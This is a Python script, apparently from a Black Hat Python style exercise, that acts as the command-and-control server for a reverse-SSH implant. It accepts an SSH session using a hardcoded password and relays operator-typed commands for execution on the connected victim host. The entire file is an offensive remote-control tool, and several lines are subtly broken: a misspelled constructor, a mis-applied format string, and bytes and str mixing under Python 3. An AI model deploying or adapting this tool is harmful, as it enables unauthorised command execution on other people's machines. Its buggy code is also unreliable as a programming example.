# Ver 0.3
# C2 server for the reverse-SSH client script
# Commands entered here are executed on the host with the client script
# Should be Python 3 compatible

import socket
import paramiko
import threading
import sys

# File available on the Paramiko Official GitHub:
# https://github.com/paramiko/paramiko/blob/master/demos/test_rsa.key
host_key = paramiko.RSAKey(filename='test_rsa.key')


# Server class for SSH connections
class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'justin') and (password == 'lovesthepython'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


server = sys.argv[1]
ssh_port = int(sys.argv[2])

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print('[+] Listening for connections on %s' % server)
    client, addr = sock.accept()
except Exception as e:
    print('[-] Listen failed: %s' % str(e))
    sys.exit(1)
print('[+] Got a connection from %s:%s' % client, addr)

try:
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException:
        print('[-] SSH negotiation failed.')
    chan = bhSession.accept(20)
    print('[+] Client successfully authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to the bh_ssh')
    while True:
        try:
            command = input("Enter command: ").strip('\n')
            if command != 'exit':
                chan.send(command)
                print(chan.recv(1024) + '\n')
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception as e:
    print('[-] Caught exception: %s' % str(e))
    try:
        bhSession.close()
    except:
        pass
    sys.exit(1)
